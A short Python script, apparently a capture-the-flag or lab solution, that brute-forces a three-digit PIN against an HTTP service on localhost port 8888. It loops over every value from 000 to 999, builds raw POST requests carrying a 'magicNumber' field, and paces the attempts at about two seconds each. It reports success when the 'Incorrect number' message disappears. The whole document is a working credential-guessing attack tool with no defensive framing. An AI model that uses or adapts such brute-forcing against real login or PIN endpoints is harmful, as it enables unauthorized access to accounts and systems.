import socket
import time  

HOST = '127.0.0.1'
PORT = 8888

last_output = None

for attempt in range(1000):
    start = time.time()
    pin = str(attempt).zfill(3)
    payload = f'magicNumber={pin}'



    request = (
        "POST / HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(payload)}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{payload}"
    )

    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        s.send(request.encode())

        response = b""
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk

        output = response.decode(errors="ignore")

        if output != last_output:
            print("=" * 60)
            print(f"[DEBUG] New response for PIN {pin}")
            print(output)
            print("=" * 60)
            last_output = output

        if "Incorrect number" not in output:
            print(f"SUCCESS, YOU UNLOCK IT! PIN is: {pin}")
            break
        else:
            print(f"Trying PIN {pin} -> ENGK WRONG")

        s.close()

        elapsed = time.time() - start
        if elapsed < 2.0:
            time.sleep(2.0 - elapsed)

    except Exception as e:
        print(f"[!] Error with {pin}: {e}")
        continue